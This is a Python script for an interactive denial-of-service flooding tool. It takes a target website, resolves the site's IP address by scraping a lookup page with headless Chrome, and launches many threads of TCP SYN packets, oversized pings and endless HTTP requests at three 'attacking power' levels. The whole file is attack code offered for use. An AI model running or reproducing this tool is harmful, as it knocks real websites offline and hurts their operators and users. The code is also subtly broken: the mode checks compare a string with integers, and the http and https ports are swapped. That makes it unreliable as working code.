from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from scapy.all import IP, TCP, send
import os, threading, requests
from selenium import webdriver
from banner import banner
from colorama import *
from os import system
init(autoreset=True)
system('cls||clear')

print(banner)

guc = input(f"""\n
    {Fore.GREEN}Attacking Power:
        {Fore.BLUE}1: Easy Mode
        {Fore.GREEN}2: Normal Mode
        {Fore.LIGHTBLACK_EX}3: Ultra Mode{Fore.RED}(Extreme)
        {Fore.GREEN}Selection(1/2/3): """)
system('cls||clear')
url = input(Fore.GREEN+"WebSite: "+Fore.RESET)
thread_c = int(input(Fore.GREEN+'Thread Count: '+Fore.RESET))

if 'http://' in url or 'https://' in url:
    pass
else:
    res = requests.get('https://'+url)
    if res.status_code != 200:
        url = 'http://'+url
    else:
        url = 'https://'+url

opt = Options()
opt.add_argument('--headless')
driver = webdriver.Chrome(options=opt)
driver.get(f'https://www.ipsorgu.com/site_ip_adresi_sorgulama.php?site={url}#sorgu')
target_ip = driver.find_element(By.XPATH, '/html/body/table/tbody/tr/td/table/tbody/tr[5]/td/div/p[5]/span[3]').text
if "https://" in url:
    target_port = 80
else:
    target_port = 443
if guc == 1:
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / ("X" * 460)
elif guc == 2:
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / ("X" * 920)
elif guc == 3:
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / ("X" * 1460)
if guc == 1:
    def func():
        def request():
            while True:
                requests.get(url, verify=False)
        def ping():
            while True:
                os.system(f"ping {url} -t -l 10536")
        threads = []
        for _ in range(thread_c):
            thread = threading.Thread(target=ping, args=(request,send(syn_packet, verbose=True)))
            thread.start()
            threads.append(thread)
    threads = []
    for i in range(thread_c):
        thread = threading.Thread(target=func)
        thread.start()
        threads.append(thread)
elif guc == 2:
    def func():
        def request():
            while True:
                requests.get(url, verify=False)
        def ping():
            while True:
                os.system(f"ping {url} -t -l 32283")
        threads = []
        for _ in range(thread_c):
            thread = threading.Thread(target=ping, args=(request,send(syn_packet, verbose=True)))
            thread.start()
            threads.append(thread)
    threads = []
    for i in range(thread_c):
        thread = threading.Thread(target=func)
        thread.start()
        threads.append(thread)
elif guc == 3:
    while True:
        def func():
            def request():
                while True:
                    requests.get(url, verify=False)
            def ping():
                while True:
                    os.system(f"ping {url} -t -l 65536")
            threads = []
            for _ in range(thread_c):
                thread = threading.Thread(target=ping, args=(request,send(syn_packet, verbose=True)))
                thread.start()
                threads.append(thread)
        threads = []
        for i in range(thread_c):
            thread = threading.Thread(target=func)
            thread.start()
            threads.append(thread)
